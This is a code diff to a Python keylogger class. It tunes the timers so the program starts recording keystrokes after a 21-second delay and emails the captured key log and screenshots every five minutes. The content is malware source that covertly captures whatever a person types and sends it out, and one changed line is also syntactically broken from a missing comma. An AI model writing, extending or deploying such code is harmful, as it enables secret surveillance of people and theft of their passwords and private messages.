@@ -29,10 +29,10 @@ class Keylogger:
         keyboard.on_press(self.handle_ctrl_q)
 
         # Start recording the keys after a 21-second delay
-        Timer(5, keyboard.on_press, args=(self.record_keys,)).start()
+        Timer(21, keyboard.on_press, args=(self.record_keys,)).start()
 
         # Start sending the keys and screenshot every 5 minutes  300sec
-        Timer(10, self.send_data).start()
+        Timer(300, self.send_data).start()
 
         # Keep the program running
         input("Press Enter to stop...")
@@ -57,7 +57,7 @@ class Keylogger:
         with open(self.log_file, "r") as file:
             keys = file.read()
         self.send_email("Key Log and Screenshot", keys)
-        Timer(10, self.send_data).start()
+        Timer(300 self.send_data).start()
 
     def send_email(self, subject, body):
         message = MIMEMultipart()
